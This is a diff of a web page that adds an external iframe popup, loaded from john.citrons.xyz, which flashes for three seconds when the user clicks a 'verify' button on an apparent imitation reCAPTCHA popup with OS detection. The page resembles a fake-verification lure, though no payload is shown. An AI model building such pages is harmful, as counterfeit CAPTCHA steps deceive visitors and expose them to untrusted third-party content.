@@ -78,16 +78,6 @@
         .recaptcha-popup.active {
             display: block;
         }
-        .recaptcha-popup h3 {
-            margin: 0 0 15px;
-            font-size: 24px;
-            color: #333;
-        }
-        .recaptcha-popup p {
-            font-size: 18px;
-            color: #333;
-            margin: 5px 0;
-        }
         .overlay {
             position: fixed;
             top: 0;
@@ -115,6 +105,24 @@
             object-fit: cover;
             z-index: 1000;
         }
+        /* Styles for iframe popup */
+        .iframe-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100%;
+            max-width: 732px;
+            height: 94px;
+            z-index: 100;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            background: #fff;
+        }
+        .iframe-popup.active {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -136,6 +144,12 @@
             </div>
         </div>
     </div>
+
+    <!-- Iframe popup container -->
+    <div class="iframe-popup" id="iframePopup">
+        <iframe src="https://john.citrons.xyz/embed?ref=example.com" style="width: 100%; height: 100%; border: none;"></iframe>
+    </div>
+
     <script>
         function detectOS() {
             const userAgent = window.navigator.userAgent.toLowerCase();
@@ -188,12 +202,19 @@
             const overlay = document.getElementById("overlay");
             recaptchaPopup.classList.add("active");
             overlay.classList.add("active");
+
+            const iframePopup = document.getElementById("iframePopup");
+            iframePopup.classList.add("active");
+
+            setTimeout(function() {
+                iframePopup.classList.remove("active");
+            }, 3000);
         }
 
         const verifyButton = document.getElementById('verifyButton');
         verifyButton.addEventListener('click', verify);
 
-        // Check if it's a mobile device and display the image
+
         if (isMobile()) {
             document.getElementById('mobileImage').style.display = 'block';
             document.querySelector('.container').style.display = 'none';
